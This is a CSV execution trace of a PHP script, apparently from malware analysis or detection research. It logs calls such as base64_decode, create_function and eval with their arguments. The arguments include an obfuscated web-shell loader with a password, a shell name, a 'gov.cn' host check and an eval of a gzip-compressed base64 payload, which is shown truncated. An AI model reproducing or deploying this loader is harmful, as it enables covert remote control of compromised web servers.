uuid,file_md5,index,source,target,argc,argv,return,dynamic
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,0,__main__,zend_compile_file,2.0,"{""value"": []}","{""value"": ""26262609413C39413C3A413C505142413C2B395051423C3A2A080808080808080808080808080808080808080808080808080808080808082663413C263B41423D263B3D3E""}",[]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,1,__main__,error_reporting,1.0,"{""value"": [[0, ""new_error_level"", 5]]}","{""value"": ""void""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,2,__main__,set_time_limit,1.0,"{""value"": [[0, ""seconds"", 0]]}","{""value"": ""void""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,3,__main__,header,1.0,"{""value"": [[0, ""header"", ""content-Type: text/html; charset=gb2312""]]}","{""value"": ""void""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,4,__main__,zend_fetch_r_server,1.0,"{""value"": [[0, ""op1"", ""_SERVER""]]}","{""value"": []}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,5,__main__,stristr,2.0,"{""value"": [[0, ""haystack"", ""127.0.0.1:5001""], [1, ""needle"", ""gov.cn""]]}","{""value"": false}","[135, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,6,__main__,base64_decode,1.0,"{""value"": [[0, ""str"", ""Q3JlYXRlX0Z1bmN0aW9u""]]}","{""value"": ""Create_Function""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,7,__main__,create_function,2.0,"{""value"": [[0, ""args"", """"], [1, ""code"", ""$password='92429242';\r\n$shellname='sky in';$myurl='http://www.zjjv.com';\r\neval(gzuncompress(base64_decode('\r\neJzsvWlv60qaJvi9gf4Pi""]]}","{""value"": ""\\x00lambda_1""}","[0, 0]"
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,8,create_function,zend_compile_string,2.0,"{""value"": [[0, ""source_string"", ""function __lambda_func(){$password='92429242';\r\n$shellname='sky in';$myurl='http://www.zjjv.com';\r\neval(gzuncompress(base64_decode('\r\neJzsvWlv60qaJvi9gf4PiUIBlYmbqGZwJwo5QJAMStRiyVptDQ\nYJWfd40S4fSZbU6P8+zxMkJcrLOSdvV1ejZ+pWnbQtcYnlXZ53\njf/6X1YPf/++Hb9u//yXf/v92+PL8tuf/2VxHP/+++u379//5a\n///Peu6gxU5//+l27USdu9vydpQ93IpvqX/+dy/Xr1fbse68v5\n4231+vvly+/P3+bz5XjxDd+efy+/a/c6x1f651/+7XG3nGxfVs\ns/reUordb+/M/N7Wu6fOKtq7e/GX/57//c/NPf/rT907/+6fXf\n/rkp8HsXv+ND/g8+McufvH7D/+zxqYVPcfWfz9+sX1dbMf7rn9\nb493frL7jE1pdYeKH5Z176unpYv+LK278bLh/1uGz99U8r469/\n2th/+QtvcP6Gm/5cvuX5pbZs/as8rUSz9a91Q9X/tWEMrfivvK\n5nzt7+on9rxnPnL/zv314e/6ynhUmFXTzN+fO//Mtfrx+qJ68v\nxiXYof/xbf79239//bbdvS7/9Pml//Y//sd//S/nZawtotXv38\n5f/39p+X6yCv/1v+Qk9E9/+1v8/c6Yhov0tD7c7FfztL85Duvt\nOyP+7h32g/6kHxqBORq2btfpsTNqtkRl0hpvop25WsSdzaxbS0\n7BaWMYb4OHaq/5IqurO7FYH4f94bZqrh9TMzTS/tpIrdXByD/H\nc/c3SbS7aW9Eq78RQW/40KgtvUN7/aT6w4fH02oyw1xbRjgpPq\nv2VpNmL35cz4f6PbPe+unYi7fG7eD8/Me3wWRrrnfD3sAITqsH\nzOcxHW+2sbUKh0mUzTFpLma1ZvBUuds3xo2nQft+X/7Xebuf2u\n3R8/ptNLupNvbb9mrSra24FrPGPprfZOP57abdfJK94fax8n37\nePu6fezj3Uk0CjqV761uEg/bd6ZTa3JsvHen6o3DEM+394MHo9\nZ4btVXR9UfBPnzvGOiKrNq3GtxXZK7vZ7HabCdZr+/2LXlPsC9\nem16zR3m8jDobxZD/Nvtm5On+t1knY11vJ2vDVlf2qlZfw5qS0\nPTTe/udKzpuQ8f4lvOf6rad0dprR6lWX8LTuspPtsMF7WXI/YD\ne/cyMxsnftZ995mwQrwrfGp00nTTHjzGaRwLo3IbdNMw7dxPjO\nNohfceOI7UbJ528/W821u+zWqNiaw1p7K/wpyXW+PtfjuqN+dq\n/ro9JJd3N8zVsVkbPGCvHo+9pfXT96V/7H3dL96HOfPzR1wzXl\nvD7XQ+PLbqy+mmfed0T3z24DfQ3Xz64+9n2+R1Nxyvd7OMVh5s\njCXI1xr7vL3Bvh/aS2NzWh1noKVpfp3e19pm4ST159RcvoA+Vr\nLeXHRry8dubxjEtdWbSu6wzqvjk7ky1Ly2SEEvx95qhz3FGqwX\nx97dNuOp8vNHH97BcWBc34Le5vAInoj79S344CDMxmG7X02l1Z\ngra00+e1BW8zntgc9Ia/vVsWWtvktzNW9Zw4cRnnfsvR6D4wpr\nt3lzapsT6TKlDKjl8qR99zirxYdurZk4lfuTynkS732I65tI9T\nYVfH7E5yc1Dyd6nu27txTPxecWPj/yc9D5Y9pbLpz2Zno8rd+k\nSMfbpBLJzsBKT6tgrfnpbmyARrAnC4x/sqs3v0sLewH6bewHLw\nPw2SEZPd7ckl4HXVGNQUuVYdOoV1tpkkijun88VrtN/JOiftgm\nzafuaTU/9prntfswv32T1y2C3uqt1Y/JY8bgdjSb8vO25tlTqz\nMI7PYgmzfWsVHQXy/ebQv6WwzHkI8FrU5IhwNr+JivB/Zg/cLn\nNzRPNuaQfXzed/D8zSdr/oz1Jo8fII++D83VDcbF/cJzNs+B2f\niu6s1xcGy8cGw3cy2jcV9GJ9XxGvu+XnR7a31fDHrG39lzSAfJ\nZr7rbRay3piW19oxVxNlNZ7TcZOy/QgePB63bWmAl0FXO9DRW9\nAFPZn1fdCLOc6FGkMmjlcvGCv5WL+jdV6HMz08YdyLo/XVePAM\na+3IX6bJbJ6jWpPyEvTZfJB9rVfOe7SeN46c06y3Ou7M9a/KV3\n3/dD94nh0H4P3ly6RXWt/s52OZxlsG9no+1L//YC35fA968DxG\nEJd8HLfl4SxnNkkgOGa1tS/3/tNfxV/+7az4DdxAxqtCcLbaA4\nKAiSGaUKpa2IyhSCZUEMpcYUDN7+pNHrHJ+9Z89QChur3Z6/vH\nGNA4SLLrW/sQgvDVEO2CuOLxdr8+qhoG0xtsOfBDgoXfDqxONR\n42reVpYsXxrl81hrej35vH5dswXUUOFO9Ne6DfAYV5e6wm1tFq\nHoZCRaJaw9/xeNJfj4YHuRgtKvtNdzPbGXGkqo3nbqXyHBzS2c\naMbzci+QamnmwOldmmthwNK+pt2K28dG5D8VBf3u1ENdoZlfK7\n9k/72nhjNUe7dLlQ1UQdzYYl01VnV11FTSPp8t27vtpvjvK06S\nVxWquo7mE5CGqvb/KAnTcaxrq2nK/FXbwbx52nak1tesu7tLoZ\n7qz78rteqlX1sukvu9iR6U0a9461uNWtxu1utcqf/DfqdsK4i/\nd2D7HYGnEraKviu5/9K7/rV+/5o//+813/+a7/fNd/vus/3/XZ\nu4zNiz+/jzf1uAOg+eK3Id+N2PCT2L6BSd+tJrxnuKnFt/j5Ev\nMZRmwFCX82L8817k+tNFb4vbvrrTqBoR5bb9W9XYn2g3pjPqRu\nvbnfryu4tpPcBqfmtNmV402qLFl7HcqOlMO39ben5HVqVzeGfU\nh2m9pmtxHLVvO4uk8Pq0R11w9OJxzqZ23v99Nq2n+qqe5wsek0\nqxWhbquzQVeZSqx/l9YoSs2G+1SVi2r99WUj1tGwN5Kp2Hx7NN\nVS1pL4eExqHLvCmIJiHp1Ka3dbbe3w+7AqBxLrRRDz77QvboC1\nbh5W9aek4Tqd2k7dbgbd6sikjg2w9uI0IIh6HszvTt3ayOA4gn\n1z5/Sa/e5h861h8r6kNRF3L43D6P4pUeY6bdaax7QGHf7SGNee\nJumqL0wV4X0Kexphnzrv96TaWxkAnnpuAIKBsdjgemU3D/n720\n2jaTZnk2PlJX5rWI/t19rubTl93MvxsFI9tbqb5SaVdrMSv0x7\nFTk8xNObfo3GipUawEBms901Gq2jsW5LAVywWAlYrX2JOc+q8Q\nL/7IN5XlsYw8oGjXXTA6z6mpql2HdgmPGkt0zlKbFm1XS/OTR6\n6VgtHg/y99ZCfpt0llKajeRX17+gm46R/X0s6Jk4phrfHkHPEn\niu21E2eOIFe0L+GHff4x5jyZ9n3NOtVjrZ9+ph1lPRprOaDo56\nHX8z3gZjUVue13nUV62hsenAGOw33xoCmLC5G686M2NUG4o03I\niNq/orK01ja3eb9pWlzvQ+OjUXD1bclF3VFZ1kOewmalhtzAbW\nXWuXrmdboRY26HV42FibTlLpGiulFqv5+jRqybSqZuDlo0iVOl\nSXx1rVvOmvZ8dqbbGpVu/T+tIaHdf9bkF/SRperZ+RrUe+PpLy\nQC3uM3kB3Im/wS+a//X12N8mf6ZYu/Q2oewYyupH+aD3H/Q4ul\n0/lWSEOhZ0mFS7qbGMN8ZSDY3kZXhK+sdO9aWR1k7puOaqnqwB\nnz8H80Zz1xt965xqcdDeOBNTPgzHlfbxsE53/eVdt7e8Px5XY1\nVvvAU1ZXSqqwd1pCFSwdwqBR3amB/odqOa1bQtU7Vv1TFes3mf\nikpbGJvB7nZ1kMfXu25n1AImFt1xZSaMdTg017f47IDPpoHBtV\nnWfkqH/zOyBHIb90MOY7GMTUt1Qu6FG+xr0cS6f3I6CjKi0tmc\n9xPyW8vr6hPv3y2SPeyiJ+ewfNhUsXa3r4NWRu9aH+w+7if/Lu\n+nSn+wn9Payi7201iswR9xejytwkkvcXzz/""]]}","{""value"": ""003E""}",[0]
c5716385a1fd249f0ff7413cc94a2ccd,d04823361075d4d89a1f2d1b886cca5a,9,__main__,__lambda_func,0.0,"{""value"": []}","{""value"": null}",[]
